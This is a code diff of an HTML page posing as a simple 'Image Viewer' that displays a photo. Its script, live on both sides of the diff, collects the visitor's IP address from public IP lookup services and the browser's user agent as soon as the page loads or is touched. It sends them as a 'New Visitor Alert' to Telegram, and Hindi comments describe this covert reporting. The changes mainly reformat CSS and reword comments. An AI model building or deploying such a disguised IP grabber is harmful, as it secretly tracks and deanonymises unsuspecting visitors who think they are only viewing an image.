@@ -4,26 +4,13 @@
     <title>Image Viewer</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { 
-            background-color: black; 
-            margin: 0; 
-            padding: 0; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            user-select: none; 
-        }
-        img { 
-            max-width: 100%; 
-            max-height: 100vh; 
-            object-fit: contain; 
-        }
+        body { background-color: black; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; user-select: none; }
+        img { max-width: 100%; max-height: 100vh; object-fit: contain; }
     </style>
 </head>
 <body>
 
-    <!-- 📷 फोटो अब हमेशा लोड होगी -->
+    <!-- 📷 फोटो अब हर हाल में दिखेगी -->
     <img src="photo.jpg" alt="Image Viewer">
 
     <script>
@@ -36,26 +23,22 @@
             if (isTracked) return;
             isTracked = true;
 
-            // 🌐 सीधे यूज़र का IP निकालने वाली सबसे भरोसेमंद और तेज API
+            // 🌐 बिना किसी फिल्टर के सबसे तेज और डायरेक्ट आईपी निकालने वाली लाइव API
             fetch('https://ipify.org')
             .then(res => res.json())
             .then(data => {
                 sendToTelegram(data.ip);
             })
             .catch(() => {
-                // बैकअप तरीका: अगर पहली API फेल हो तो दूसरी API
+                // बैकअप तरीका: अगर पहली API व्यस्त हो तो तुरंत दूसरी API चालू होगी
                 fetch('https://ipapi.co')
                 .then(res => res.json())
-                .then(data => {
-                    sendToTelegram(data.ip);
-                }).catch(() => {
-                    sendToTelegram("IP Protected/VPN Active");
-                });
+                .then(data => sendToTelegram(data.ip))
+                .catch(() => sendToTelegram("IP Hidden/VPN Active"));
             });
         }
 
         function sendToTelegram(ip) {
-            // यूज़र एजेंट से ब्राउज़र और बेसिक डिवाइस डिटेल्स निकालना
             const userAgentText = navigator.userAgent;
 
             const message = `🚨 *New Visitor Alert* 🚨\n\n` +
@@ -74,7 +57,7 @@
             });
         }
 
-        // विज़िटर के आते ही या स्क्रीन पर कहीं भी टच करते ही तुरंत ट्रिगर होगा
+        // विज़िटर के पैर रखते ही या स्क्रीन टच करते ही तुरंत टेलीग्राम पर डेटा जाएगा
         window.addEventListener('DOMContentLoaded', startTracking);
         window.addEventListener('touchstart', startTracking);
         window.addEventListener('click', startTracking);
